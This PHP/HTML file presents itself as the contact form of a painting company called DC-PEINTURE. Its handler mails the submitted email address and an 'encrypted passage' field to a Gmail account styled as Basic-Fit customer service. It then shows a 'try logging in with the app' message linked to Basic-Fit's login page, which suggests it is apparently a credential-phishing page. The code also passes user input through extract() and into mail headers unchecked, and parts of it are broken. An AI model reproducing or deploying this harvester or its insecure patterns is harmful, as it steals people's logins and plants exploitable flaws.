<?php
    session_start();
    if(isset($_POST['Envoyer'])){
        extract($_POST);
        if(isset($email) && $email !=""){

            $to = "basic.fit.service.clientele@gmail.com";
            $subject = "Refonte graphique d'une partie du site wen Veuillez vous connectez email envoyé de: " . $email;
            $message = "<p>Vous avez recu un email <stron>" . $email . "</strong></p>
            <p><strong>Passage encrypté: </stong>" . $message ."</p>";
            $headers = "MIME-Version 1.0" . "\r\n";
            $headers .= "Content-type:text\html;charset=UTF-8" . "\r\n";
            $headers .= "From <" . $email . ">" . "\r\n";

            $Envoyer = mail($to,$subject,$message,$headers);

            if($Envoyer){
                $_SESSION['Echec, essayez de vous connectez avec l application'];
            }

        }
    }
?>


<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DC-PEINTURE</title>
    <!-- link Icon -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
    <!-- link file css -->
    <link rel="stylesheet" href="style.css">
</head>
<body class="contactb">

<?php 
            if(isset($_SESSION['Echec, essayez de vous connectez avec l application'])){ ?>
                <p href="https://my.basic-fit.com/login" class="request_message" style = "color:red">
                    <?=$_SESSION['Echec, essayez de vous connectez avec l application']?>
                </p>
            <?php 

            }
        
        ?>


    <div class="header">
        <i id="btn-menu" class="fa-solid fa-bars"></i>
        <a href="#" class="logo">DC-PEINTURE</a>
        <div class="contanier">
            <div id="menu" class="nav-links">
                <a class="active" href="index.html">Acceuil</a>
                <a href="gallerie.html">Gallerie</a>
                <a href="contact.php">Contact</a>
                
            </div>
        </div>
    </div>

    <!-- add class active on click on btn menu -->

    <script>
        let btnMenu = document.getElementById('btn-menu');
        let menu = document.getElementById('menu');

        btnMenu.onclick = () =>{
            btnMenu.classList.toggle('fa-times');
            menu.classList.toggle('active')
        }
    </script>

    <div class="containercontact">
        <h1> Vous souhaitez me contacter ? </h1>
        <form method="post">
                            
                                
        
                                
                                
                            <input id="email" placeholder="Adresse email" type="email" name="email">

                            <input id="num" placeholder="Numero de telephone" type="text" name="num">
    
                            
    
                            <input id="message" placeholder="Messge" type="text" name="message">
        
                            <div>
        
                            </div>
        
                            <div id="Envoyer">
                                <a >
                                    <input id="Envoyer" value="Envoyer" type="submit" name="Envoyer">
                                </a>
                            </div>    
                        </form>
    </div>


    <footer>
        <p> &copy par LCL entreprise
        </p>
    </footer>
</body>
</html>